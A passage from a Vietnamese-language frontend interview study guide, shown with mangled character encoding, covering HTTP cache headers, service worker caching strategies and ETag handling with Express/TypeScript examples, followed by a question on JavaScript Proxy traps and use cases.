3. **Service Worker Cache**: API cache theo ch∆∞∆°ng tr√¨nh ‚Üí h·ªó tr·ª£ offline, chi·∫øn l∆∞·ª£c t√πy ch·ªânh.
4. **HTTP Cache**: Cache tr√¨nh duy·ªát theo Cache-Control headers.
5. **CDN Cache**: Servers bi√™n cache t√†i nguy√™n tƒ©nh to√†n c·∫ßu.

**üîë HTTP Cache Headers (B·∫Øt Bu·ªôc Bi·∫øt):**

| Header | M·ª•c ƒê√≠ch | V√≠ D·ª• |
|--------|----------|--------|
| **Cache-Control** | Ch·ªâ th·ªã cache ch√≠nh | `max-age=3600, public` |
| **ETag** | Token x√°c th·ª±c | `"abc123"` (hash phi√™n b·∫£n) |
| **Last-Modified** | Th·ªùi gian c·∫≠p nh·∫≠t cu·ªëi | `Thu, 01 Jan 2024 00:00:00 GMT` |
| **Expires** | Ng√†y h·∫øt h·∫°n (c≈©) | `Thu, 01 Jan 2025 00:00:00 GMT` |
| **Vary** | Thay ƒë·ªïi cache theo header | `Vary: Accept-Encoding` |

**üîß Ch·ªâ Th·ªã Cache-Control:**
- **`max-age=3600`**: Cache 1 gi·ªù (3600 gi√¢y).
- **`public`**: Cache ƒë∆∞·ª£c b·ªüi tr√¨nh duy·ªát + CDN.
- **`private`**: Ch·ªâ cache b·ªüi tr√¨nh duy·ªát (kh√¥ng CDN) ‚Üí d·ªØ li·ªáu c√° nh√¢n.
- **`no-cache`**: Ph·∫£i x√°c th·ª±c l·∫°i v·ªõi server (304 Not Modified n·∫øu kh√¥ng thay ƒë·ªïi).
- **`no-store`**: Kh√¥ng cache (d·ªØ li·ªáu nh·∫°y c·∫£m: m·∫≠t kh·∫©u, th·∫ª t√≠n d·ª•ng).
- **`immutable`**: T√†i nguy√™n kh√¥ng bao gi·ªù thay ƒë·ªïi ‚Üí kh√¥ng x√°c th·ª±c l·∫°i (t√†i nguy√™n tƒ©nh c√≥ hash).

**‚ôªÔ∏è Chi·∫øn L∆∞·ª£c Cache (Service Worker):**

1. **Cache First (T√†i nguy√™n tƒ©nh)**:
   - Ki·ªÉm tra cache ‚Üí n·∫øu c√≥ tr·∫£ v·ªÅ ‚Üí n·∫øu kh√¥ng l·∫•y t·ª´ m·∫°ng.
   - ‚úÖ D√πng cho: Fonts, h√¨nh ·∫£nh, CSS, JS c√≥ t√™n file phi√™n b·∫£n.

2. **Network First (D·ªØ li·ªáu ƒë·ªông)**:
   - L·∫•y t·ª´ m·∫°ng ‚Üí n·∫øu th·∫•t b·∫°i tr·∫£ v·ªÅ cache.
   - ‚úÖ D√πng cho: D·ªØ li·ªáu API, n·ªôi dung ng∆∞·ªùi d√πng.

3. **Stale While Revalidate**:
   - Tr·∫£ v·ªÅ cache ngay (nhanh) + l·∫•y m·∫°ng background ‚Üí c·∫≠p nh·∫≠t cache.
   - ‚úÖ D√πng cho: C√¢n b·∫±ng t·ªëc ƒë·ªô + ƒë·ªô m·ªõi (ngu·ªìn tin, m·∫°ng x√£ h·ªôi).

4. **Network Only**:
   - Lu√¥n l·∫•y t·ª´ m·∫°ng ‚Üí kh√¥ng cache.
   - ‚úÖ D√πng cho: Ph√¢n t√≠ch, d·ªØ li·ªáu th·ªùi gian th·ª±c.

5. **Cache Only**:
   - Ch·ªâ d√πng cache ‚Üí ∆∞u ti√™n offline.
   - ‚úÖ D√πng cho: V·ªè ·ª©ng d·ª•ng PWA.

**üîç ETag & Conditional Requests:**
- **ETag**: Hash c·ªßa resource content ‚Üí version identifier.
- **Flow**:
  1. Server response: `ETag: "abc123"`.
  2. Browser cache + store ETag.
  3. Next request: `If-None-Match: "abc123"`.
  4. Server check: Unchanged ‚Üí `304 Not Modified` (no body) | Changed ‚Üí `200 OK` (new content + new ETag).
- **Benefit**: Save bandwidth (304 response nh·ªè h∆°n full response).

**‚ö†Ô∏è Common Pitfalls:**
- **Cache Busting**: Static assets thay ƒë·ªïi nh∆∞ng c√πng filename ‚Üí browser serve stale cache.
  - **Solution**: Hash trong filename (`app.abc123.js`) ho·∫∑c query param (`app.js?v=123`).
- **Over-caching**: Cache sensitive data (passwords) ‚Üí security risk. D√πng `no-store`.
- **Under-caching**: Kh√¥ng cache static assets ‚Üí waste bandwidth, slow load.
- **CDN cache**: Purge CDN cache khi deploy new version.

**üí° Senior Insights:**
- **Versioning Strategy**: D√πng content hash cho static assets (`webpack`/`vite` auto generate).
- **Immutable Resources**: Set `Cache-Control: max-age=31536000, immutable` cho versioned assets ‚Üí never revalidate.
- **Service Worker**: Combine strategies (cache shell v·ªõi Cache First, API v·ªõi Network First).
- **Performance**: Cache reduce TTFB (Time To First Byte), improve Core Web Vitals (LCP, FCP).
- **DevTools**: Chrome DevTools ‚Üí Network tab ‚Üí check cache status (from disk cache, from memory cache).
- **Cache-Control vs Expires**: `Cache-Control` modern, `Expires` legacy. N·∫øu both, `Cache-Control` wins.

**üöÄ Best Practices:**
1. **Static assets**: Long max-age (1 year) + immutable + hash filenames.
2. **HTML**: `no-cache` ‚Üí always revalidate (ETag/Last-Modified).
3. **API**: Short max-age (5 minutes) ho·∫∑c `no-cache` + ETag.
4. **User-specific data**: `private` (not `public`).
5. **Sensitive data**: `no-store`.

---

**‚ö° Quick Summary:**
> HTTP Cache = Cache-Control, ETag. Browser Cache = disk/memory cache. Service Worker = offline cache

**üí° Ghi Nh·ªõ:**
- üì¶ **Cache-Control**: max-age, no-cache, no-store
- üè∑Ô∏è **ETag**: Validation token cho conditional requests
- üíæ **Storage**: localStorage (persist), sessionStorage (tab), Cache API (PWA)

**Tr·∫£ l·ªùi:**

- **HTTP Caching**: C∆° ch·∫ø l∆∞u tr·ªØ responses ƒë·ªÉ tr√°nh t·∫£i l·∫°i resources, gi·∫£m latency v√† bandwidth
- **Cache Types**: Browser Cache, Service Worker Cache, Memory Cache, Disk Cache, CDN Cache
- **Cache Headers**: Cache-Control, ETag, Last-Modified, Expires, Vary
- **üî• ∆Øu ƒëi·ªÉm**: TƒÉng t·ªëc ƒë·ªô load page, gi·∫£m server load, ti·∫øt ki·ªám bandwidth, c·∫£i thi·ªán UX
- **‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm**: C√≥ th·ªÉ serve stale data, ph·ª©c t·∫°p khi manage cache invalidation, storage limitations

**üéØ HTTP Cache Headers & Directives:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                     HTTP CACHE ARCHITECTURE                              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                          ‚îÇ
‚îÇ  1Ô∏è‚É£  BROWSER CACHE (Memory + Disk)                                     ‚îÇ
‚îÇ      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ
‚îÇ      ‚îÇ  üì¶ Cache-Control: max-age=3600 (1 hour)               ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì¶ Cache-Control: public/private                       ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì¶ Cache-Control: no-cache/no-store                    ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì¶ ETag: "abc123" (version tag)                        ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì¶ Last-Modified: Thu, 01 Jan 2024 00:00:00 GMT        ‚îÇ       ‚îÇ
‚îÇ      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ
‚îÇ                                                                          ‚îÇ
‚îÇ  2Ô∏è‚É£  SERVICE WORKER CACHE                                              ‚îÇ
‚îÇ      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ
‚îÇ      ‚îÇ  üöÄ Cache First (Static Assets)                         ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üåê Network First (Dynamic Data)                        ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  ‚ö° Stale While Revalidate (Balance)                    ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì± Cache Only (Offline First)                          ‚îÇ       ‚îÇ
‚îÇ      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ
‚îÇ                                                                          ‚îÇ
‚îÇ  3Ô∏è‚É£  CDN CACHE (Edge Servers)                                          ‚îÇ
‚îÇ      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ
‚îÇ      ‚îÇ  üåç Cloudflare, AWS CloudFront, Fastly                  ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üì° Geographic distribution                             ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  ‚ö° Edge caching for static assets                      ‚îÇ       ‚îÇ
‚îÇ      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ
‚îÇ                                                                          ‚îÇ
‚îÇ  4Ô∏è‚É£  APPLICATION CACHE (LocalStorage, IndexedDB)                       ‚îÇ
‚îÇ      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ
‚îÇ      ‚îÇ  üíæ localStorage (5-10MB, synchronous)                  ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üíæ sessionStorage (per-tab)                            ‚îÇ       ‚îÇ
‚îÇ      ‚îÇ  üíæ IndexedDB (large data, async)                       ‚îÇ       ‚îÇ
‚îÇ      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. HTTP CACHE HEADERS - Server-Side Setup
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Express.js example - Setting cache headers
import express, { Request, Response } from 'express';
import path from 'path';

const app = express();

// üî• Static Assets - Long-term caching (1 nƒÉm)
// Cho c√°c file c√≥ hash trong t√™n: app.abc123.js
app.use(
  '/static',
  express.static('public', {
    maxAge: '365d', // Cache 1 nƒÉm
    immutable: true, // B√°o browser file n√†y kh√¥ng bao gi·ªù thay ƒë·ªïi
    setHeaders: (res: Response, filePath: string) => {
      // Set cache headers chi ti·∫øt
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
      res.setHeader('Vary', 'Accept-Encoding'); // Cache ri√™ng cho gzip/brotli
    },
  })
);

// üéØ HTML Files - No cache (lu√¥n ki·ªÉm tra m·ªõi nh·∫•t)
app.get('*.html', (req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache'); // Ch√∫ gi·∫£i: HTTP/1.0 backward compatibility
  res.setHeader('Expires', '0'); // Ch√∫ gi·∫£i: Legacy browsers
  res.sendFile(path.join(__dirname, 'public', req.path));
});

// ‚ö° API Responses - Short-term caching (5 ph√∫t)
app.get('/api/data', (req: Request, res: Response) => {
  const data = { message: 'Hello World', timestamp: Date.now() };

  // Cache 5 ph√∫t, nh∆∞ng revalidate v·ªõi server
  res.setHeader('Cache-Control', 'public, max-age=300, must-revalidate');

  // ETag ƒë·ªÉ conditional requests
  const etag = generateETag(data); // Ch√∫ gi·∫£i: Hash c·ªßa data
  res.setHeader('ETag', etag);

 // Ch√∫ gi·∫£i: Last-Modified header
  res.setHeader('Last-Modified', new Date().toUTCString());

  // Ki·ªÉm tra If-None-Match header (ETag matching)
  if (req.headers['if-none-match'] === etag) {
    // Data kh√¥ng ƒë·ªïi ‚Üí 304 Not Modified (kh√¥ng g·ª≠i body)
    return res.status(304).end();
  }

  res.json(data);
});

 // Ch√∫ gi·∫£i: üì¶ Images - Medium-term caching (1 tu·∫ßn)
app.use('/images', (req: Request, res: Response, next) => {
  res.setHeader('Cache-Control', 'public, max-age=604800'); // Ch√∫ gi·∫£i: 7 days
  res.setHeader('Vary', 'Accept'); // Cache ri√™ng cho WebP/JPEG
  next();
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 2. ETAG GENERATION (T·∫°o Version Tag)
 // Ch√∫ gi·∫£i: ============================================

import crypto from 'crypto';

function generateETag(data: any): string {
  // Hash n·ªôi dung ƒë·ªÉ t·∫°o ETag unique
  const hash = crypto
    .createHash('md5')
    .update(JSON.stringify(data))
    .digest('hex');

  return `"${hash}"`; // Ch√∫ gi·∫£i: ETag format: "abc123"
}

 // Ch√∫ gi·∫£i: S·ª≠ d·ª•ng ETag cho conditional requests
async function fetchWithETag(url: string, cachedETag?: string): Promise<any> {
  const headers: HeadersInit = {};

  // G·ª≠i ETag ƒë√£ cache ƒë·ªÉ ki·ªÉm tra
  if (cachedETag) {
    headers['If-None-Match'] = cachedETag;
  }

  const response = await fetch(url, { headers });

  // 304 Not Modified ‚Üí D√πng cached data
  if (response.status === 304) {
    console.log('‚úÖ S·ª≠ d·ª•ng cached data (304 Not Modified)');
    return null; // Kh√¥ng c√≥ data m·ªõi
  }

 // Ch√∫ gi·∫£i: 200 OK ‚Üí Data m·ªõi, l∆∞u ETag
  const newETag = response.headers.get('ETag');
  const data = await response.json();

  console.log('üì• Data m·ªõi, l∆∞u ETag:', newETag);

  return { data, etag: newETag };
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. BROWSER CACHE API - Client-Side Caching
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî• Cache Manager Class
class CacheManager {
  private cacheName = 'my-app-cache-v1';

  // L∆∞u response v√†o cache
  async cacheResponse(url: string, response: Response): Promise<void> {
    try {
      const cache = await caches.open(this.cacheName);

      // Clone response v√¨ response.body ch·ªâ ƒë·ªçc ƒë∆∞·ª£c 1 l·∫ßn
      await cache.put(url, response.clone());

      console.log(`‚úÖ Cached: ${url}`);
    } catch (error) {
      console.error('‚ùå Cache error:', error);
    }
  }

 // Ch√∫ gi·∫£i: L·∫•y response t·ª´ cache
  async getCachedResponse(url: string): Promise<Response | undefined> {
    try {
      const cache = await caches.open(this.cacheName);
      const cachedResponse = await cache.match(url);

      if (cachedResponse) {
        console.log(`‚úÖ Cache hit: ${url}`);
        return cachedResponse;
      }

      console.log(`‚ùå Cache miss: ${url}`);
      return undefined;
    } catch (error) {
      console.error('‚ùå Cache read error:', error);
      return undefined;
    }
  }

  // X√≥a cache c≈©
  async clearOldCaches(): Promise<void> {
    const cacheNames = await caches.keys();

    await Promise.all(
      cacheNames.map((name) => {
        // X√≥a cache kh√¥ng ph·∫£i version hi·ªán t·∫°i
        if (name !== this.cacheName) {
          console.log(`üóëÔ∏è Deleting old cache: ${name}`);
          return caches.delete(name);
        }
      })
    );
  }

  // Cache nhi·ªÅu URLs c√πng l√∫c
  async cacheUrls(urls: string[]): Promise<void> {
    const cache = await caches.open(this.cacheName);
    await cache.addAll(urls); // T·ª± ƒë·ªông fetch v√† cache
    console.log(`‚úÖ Cached ${urls.length} URLs`);
  }
}

 // Ch√∫ gi·∫£i: S·ª≠ d·ª•ng Cache Manager
const cacheManager = new CacheManager();

 // Ch√∫ gi·∫£i: Fetch v·ªõi cache fallback
async function fetchWithCache(url: string): Promise<any> {
  try {
    // 1. Ki·ªÉm tra cache tr∆∞·ªõc
    const cachedResponse = await cacheManager.getCachedResponse(url);

    if (cachedResponse) {
      return await cachedResponse.json();
    }

 // Ch√∫ gi·∫£i: 2. Cache miss ‚Üí Fetch t·ª´ network
    const response = await fetch(url);

    // 3. L∆∞u v√†o cache cho l·∫ßn sau
    await cacheManager.cacheResponse(url, response);

    return await response.json();
  } catch (error) {
    console.error('‚ùå Fetch error:', error);
    throw error;
  }
}

---
---
## 21. ü™û Q21: JavaScript Proxy - Chi Ti·∫øt & Use Cases Th·ª±c T·∫ø  

**P1: T√™n c√¢u h·ªèi:** ü™û Q21: JavaScript Proxy - Chi Ti·∫øt & Use Cases Th·ª±c T·∫ø  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"Proxy l√† t√≠nh nƒÉng l·∫≠p tr√¨nh meta cho ph√©p ch·∫∑n v√† t√πy ch·ªânh h√†nh vi c·ªßa c√°c thao t√°c tr√™n object.**

**üì¶ Kh√°i Ni·ªám C·ªët L√µi:**
- **C√∫ ph√°p**: `new Proxy(target, handler)` ‚Üí B·ªçc object v·ªõi h√†nh vi t√πy ch·ªânh.
- **Handler Traps (B·∫´y)**: 13 b·∫´y ƒë·ªÉ ch·∫∑n c√°c thao t√°c (get, set, has, deleteProperty, apply, construct, v.v.).
- **Reflect API**: API ƒë·ªìng h√†nh cung c·∫•p h√†nh vi m·∫∑c ƒë·ªãnh ‚Üí d√πng trong b·∫´y ƒë·ªÉ chuy·ªÉn ti·∫øp thao t√°c ƒë√∫ng c√°ch.
- **Trong su·ªët**: Proxy ho√†n to√†n trong su·ªët ‚Üí code s·ª≠ d·ª•ng kh√¥ng bi·∫øt ƒëang d√πng proxy.

**üîß 13 B·∫´y Proxy (Quan Tr·ªçng Nh·∫•t):**
1. **`get(target, property, receiver)`**: Ch·∫∑n truy c·∫≠p thu·ªôc t√≠nh ‚Üí validation, logging, lazy loading.
2. **`set(target, property, value, receiver)`**: Ch·∫∑n g√°n gi√° tr·ªã ‚Üí validation, reactivity (Vue, MobX).
3. **`has(target, property)`**: Ch·∫∑n to√°n t·ª≠ `in` ‚Üí ·∫©n thu·ªôc t√≠nh.
4. **`deleteProperty(target, property)`**: Ch·∫∑n `delete` ‚Üí ngƒÉn x√≥a.
5. **`apply(target, thisArg, args)`**: Ch·∫∑n g·ªçi h√†m ‚Üí logging, gi·ªõi h·∫°n t·∫ßn su·∫•t.
6. **`construct(target, args, newTarget)`**: Ch·∫∑n to√°n t·ª≠ `new` ‚Üí singleton pattern.
7. **`getPrototypeOf()`, `setPrototypeOf()`**: Ch·∫∑n truy c·∫≠p chu·ªói prototype.
8. **`defineProperty()`, `getOwnPropertyDescriptor()`**: Ch·∫∑n ƒë·ªãnh nghƒ©a thu·ªôc t√≠nh.
9. **`ownKeys()`**: Ch·∫∑n `Object.keys()`, `for...in` ‚Üí l·ªçc keys.
10. **`preventExtensions()`, `isExtensible()`**: Ch·∫∑n t√≠nh m·ªü r·ªông.

**üéØ Tr∆∞·ªùng H·ª£p S·ª≠ D·ª•ng Th·ª±c T·∫ø:**
- **Validation (X√°c th·ª±c)**: T·ª± ƒë·ªông validate khi g√°n thu·ªôc t√≠nh ‚Üí x√°c th·ª±c form, ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu.
- **Reactivity (Ph·∫£n ·ª©ng - Vue 3)**: Proxy b·ªçc state ‚Üí theo d√µi ph·ª• thu·ªôc ‚Üí t·ª± ƒë·ªông render l·∫°i.
- **Logging/Debugging**: Ghi log m·ªçi truy c·∫≠p/s·ª≠a ƒë·ªïi thu·ªôc t√≠nh ‚Üí audit trail.
- **API Mocking**: B·ªçc API client ‚Üí t·ª± ƒë·ªông th·ª≠ l·∫°i, cache, x·ª≠ l√Ω l·ªói.
- **React Hook Form**: Proxy b·ªçc form state ‚Üí theo d√µi fields b·ªã thay ƒë·ªïi, validate khi thay ƒë·ªïi.
- **Lazy Loading**: Truy c·∫≠p thu·ªôc t√≠nh k√≠ch ho·∫°t t·∫£i b·∫•t ƒë·ªìng b·ªô ‚Üí t·ªëi ∆∞u k√≠ch th∆∞·ªõc bundle.
- **Ki·ªÉm so√°t truy c·∫≠p**: Ch·∫∑n truy c·∫≠p thu·ªôc t√≠nh kh√¥ng ƒë∆∞·ª£c ph√©p ‚Üí b·∫£o m·∫≠t.

**üîç C∆° Ch·∫ø React Hook Form (Chi Ti·∫øt):**
```typescript
// RHF d√πng Proxy ƒë·ªÉ:
1. **Theo d√µi ƒëƒÉng k√Ω field**: b·∫´y get ‚Üí t·ª± ƒë·ªông ƒëƒÉng k√Ω field khi truy c·∫≠p.
2. **Validate khi thay ƒë·ªïi**: b·∫´y set ‚Üí k√≠ch ho·∫°t validation khi setValue.
3. **Theo d√µi tr·∫°ng th√°i dirty**: So s√°nh proxy state v·ªõi gi√° tr·ªã m·∫∑c ƒë·ªãnh.
4. **H·ªó tr·ª£ object l·ªìng nhau**: Proxy ƒë·ªá quy cho nested fields.
5. **Hi·ªáu nƒÉng**: Ch·ªâ render l·∫°i fields b·ªã thay ƒë·ªïi (reactivity chi ti·∫øt).
```

**‚ö†Ô∏è ƒê√°nh ƒê·ªïi Hi·ªáu NƒÉng:**
- **Chi ph√≠ th√™m**: M·ªói thao t√°c c√≥ th√™m l·ªùi g·ªçi h√†m ‚Üí ch·∫≠m h∆°n ~10-20%.
- **B·ªô nh·ªõ**: Proxy object + handler object ‚Üí tƒÉng s·ª≠ d·ª•ng b·ªô nh·ªõ.
- **T·ªëi ∆∞u h√≥a**: V8 kh√¥ng t·ªëi ∆∞u ƒë∆∞·ª£c proxy nh∆∞ plain objects.
- **Th·ª±c h√†nh t·ªët**: Ch·ªâ d√πng khi c·∫ßn metaprogramming, tr√°nh l·∫°m d·ª•ng.

**üí° Ki·∫øn Th·ª©c Senior:**
- **Reflect vs Truy c·∫≠p tr·ª±c ti·∫øp**: Lu√¥n d√πng `Reflect.get/set` trong b·∫´y ‚Üí ƒë√∫ng h√†nh vi v·ªõi k·∫ø th·ª´a.
- **Revocable Proxy**: `Proxy.revocable()` ‚Üí t·∫°o proxy c√≥ th·ªÉ v√¥ hi·ªáu h√≥a (b·∫£o m·∫≠t, cleanup).
- **Proxy vs Object.defineProperty**: Proxy m·∫°nh h∆°n (ch·∫∑n 13 thao t√°c vs 1), nh∆∞ng kh√¥ng h·ªó tr·ª£ IE11.
- **Vue 2 vs Vue 3**: Vue 2 d√πng `Object.defineProperty` ‚Üí kh√¥ng ph√°t hi·ªán thay ƒë·ªïi m·∫£ng. Vue 3 d√πng Proxy ‚Üí ph√°t hi·ªán t·∫•t c·∫£.
- **Debugging**: Proxy kh√≥ debug ‚Üí d√πng `console.log` trong b·∫´y ho·∫∑c `Proxy.revocable` ƒë·ªÉ v√¥ hi·ªáu.

---
---
## 22. üèõÔ∏è Q22: JavaScript Classes  

**P1: T√™n c√¢u h·ªèi:** üèõÔ∏è Q22: JavaScript Classes  

